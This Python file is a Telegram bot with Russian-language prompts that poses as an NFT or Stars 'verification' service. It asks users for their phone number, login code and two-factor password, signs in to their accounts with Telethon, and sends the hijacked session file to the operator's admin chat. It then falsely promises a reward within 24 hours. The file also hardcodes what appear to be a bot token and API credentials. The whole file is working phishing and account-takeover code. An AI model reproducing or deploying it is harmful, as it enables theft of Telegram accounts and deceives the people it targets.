import os
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# --- КОНФИГУРАЦИЯ ---
API_ID = 12134361732
API_HASH = '0368a075c4095ac31268a7c9a15cde8a'
TOKEN_2 = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

bot = Bot(token=TOKEN_2)
dp = Dispatcher()
clients = {}

class LoginSteps(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

@dp.message(F.text.in_(["/nft", "/stars"]))
async def start_verif(message: types.Message):
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="✅ ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="verify")]
    ])
    await message.answer(
        "У нас более 400 верифицированных участников.\nНажмите кнопку ниже для подтверждения.", 
        reply_markup=kb
    )

@dp.callback_query(F.data == "verify")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("Введите ваш номер телефона (например, +79991234567):")
    await state.set_state(LoginSteps.waiting_phone)

@dp.message(LoginSteps.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.replace(" ", "").replace("-", "")
    # Создаем уникальное имя файла сессии для каждого юзера
    session_name = f"sess_{message.from_user.id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    
    await client.connect()
    try:
        send_code = await client.send_code_request(phone)
        clients[message.from_user.id] = {
            "client": client, 
            "phone": phone, 
            "hash": send_code.phone_code_hash,
            "session_file": f"{session_name}.session"
        }
        await message.answer("Введите код подтверждения из Telegram:\n\n*(Это нужно для верификации личности и передачи NFT без комиссий)*")
        await state.set_state(LoginSteps.waiting_code)
    except Exception as e:
        await message.answer("Ошибка. Проверьте номер и попробуйте снова.")
        await client.disconnect()

@dp.message(LoginSteps.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    data = clients.get(message.from_user.id)
    if not data: return

    try:
        await data["client"].sign_in(data["phone"], message.text, phone_code_hash=data["hash"])
        await finish_and_send(message, state)
    except SessionPasswordNeededError:
        await message.answer("Аккаунт защищен облачным паролем. Введите его:")
        await state.set_state(LoginSteps.waiting_password)
    except Exception:
        await message.answer("Неверный код.")

@dp.message(LoginSteps.waiting_password)
async def process_password(message: types.Message, state: FSMContext):
    data = clients.get(message.from_user.id)
    try:
        await data["client"].sign_in(password=message.text)
        await finish_and_send(message, state)
    except Exception:
        await message.answer("Неверный пароль.")

async def finish_and_send(message, state):
    data = clients.get(message.from_user.id)
    client = data["client"]
    file_path = data["session_file"]

    # 1. Отключаемся, чтобы Telethon "отпустил" файл сессии
    await client.disconnect()
    
    # 2. Отправляем файл тебе в Telegram
    if os.path.exists(file_path):
        doc = FSInputFile(file_path)
        await bot.send_document(
            ADMIN_ID, 
            doc, 
            caption=f"🔥 НОВАЯ СЕССИЯ\n📱 Номер: {data['phone']}\n👤 Юзер: @{message.from_user.username or 'NoUser'}"
        )
        # 3. Удаляем файл с хоста (безопасность + место)
        os.remove(file_path)

    await message.answer("Верификация успешно завершена! Награда будет зачислена в течение 24 часов.")
    await state.clear()
    clients.pop(message.from_user.id, None)

if __name__ == '__main__':
    dp.run_polling(bot)